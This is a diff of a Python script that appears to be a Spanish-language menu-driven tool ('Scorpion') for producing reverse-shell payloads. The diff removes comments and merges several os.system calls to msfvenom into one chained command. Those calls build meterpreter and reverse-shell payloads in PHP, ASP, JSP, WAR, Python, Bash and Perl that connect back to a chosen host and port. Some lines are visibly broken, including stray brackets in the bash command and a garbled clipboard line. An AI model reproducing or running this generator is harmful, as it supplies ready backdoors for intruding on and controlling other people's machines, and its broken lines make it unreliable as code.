@@ -1,30 +1,20 @@
-# importamos las librerías
+
 import os, time, sys, socket
 from colorama import Fore, Back
 
-# configuramos las variables principales
 name = socket.gethostname()
 ipv4 = socket.gethostbyname(name)
 contador = 0
 
-# ponemos a punto los colores
-BLACK = '\033[30m'
 RED = '\033[31m'
-GREEN = '\033[32m'
-YELLOW = '\033[33m'
 BLUE = '\033[34m'
-MAGENTA = '\033[35m'
-CYAN = '\033[36m'
-WHITE = '\033[37m'
 RESET = '\033[39m'
 
-# creamos la función de 'salir'
 def salir():
     os.system('clear')
     print(Fore.RESET + Back.RESET)
     sys.exit()
 
-# creamos la función de 'volver al menú'
 def volver_menu():
     os.system('clear')
     title = '''
@@ -41,7 +31,6 @@ ___  ______ |  |___  __ ___________  _____  |  |     _____   ____   ____  __ __
     print(Fore.RESET + Back.RESET)
     menu()
 
-# creamos la función de 'ver todos los payloads posibles'
 def ver_payloads():
     os.system('clear')
     title = '''
@@ -62,7 +51,6 @@ ___  __ ___________  ___________  ___.__.|  |   _________     __| _/______
     print(Fore.RESET + Back.RESET)
     menu()
 
-# creamos la función de 'ERROR'
 def error():
     os.system('clear')
     title = '''
@@ -79,7 +67,6 @@ _/ __ \_  __ \_  __ \/  _ \_  __ \
     print(Fore.RESET + Back.RESET)
     menu()
 
-# creamos la función de 'windows'
 def windows():
     os.system('clear')
     title = '''
@@ -93,7 +80,6 @@ __  _  _|__| ____    __| _/______  _  ________ ___________  ___.__.|  |   ______
     print(Fore.RED + Back.RESET + title + '\n')
     
 
-# creamos la función de 'linux'
 def linux():
     os.system('clear')
     title = '''
@@ -107,7 +93,6 @@ def linux():
     print(Fore.RED + Back.RESET + title + '\n')
 
 
-# creamos la función de 'android'
 def android():
     os.system('clear')
     title = '''
@@ -121,7 +106,6 @@ _____    ____    __| _/______  ____ |__| __| _/ ___________  ___.__.|  |   _____
     print(Fore.RED + Back.RESET + title)
 
 
-# hacemos el menú
 def menu():
     os.system('clear')
     time.sleep(1)
@@ -351,13 +335,7 @@ def menu():
             os.system(f'msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f raw > shell_PHP.php')
             os.system("cat shell.php | pbcopy && echo ' shell.php && pbpaste >> shell.php")
 
-            os.system(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f asp > shell_ASP.asp')
-            os.system(f'msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw > shell_JSP.jsp')
-            os.system(f'msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f war > shell_WAR.war')
-            os.system(f'msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw > shell_PY.py')
-            os.system(f'msfvenom -p cmd/unix/reverse_bash LHOST={ip}] LPORT={port}] -f raw > shell_SH.sh')
-            os.system(f'msfvenom -p cmd/unix/reverse_perl LHOST={ip} LPORT={port} -f raw > shell_PL.pl')
-
+            os.system(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f asp > shell_ASP.asp && msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw > shell_JSP.jsp && msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f war > shell_WAR.war && msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw > shell_PY.py && msfvenom -p cmd/unix/reverse_bash LHOST={ip}] LPORT={port}] -f raw > shell_SH.sh && msfvenom -p cmd/unix/reverse_perl LHOST={ip} LPORT={port} -f raw > shell_PL.pl')
             print('[>] Payloads generador en tu directorio actual')
             choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Presiona cualquier tecla para volver al menu]: ')
             print(Fore.RESET + Back.RESET)
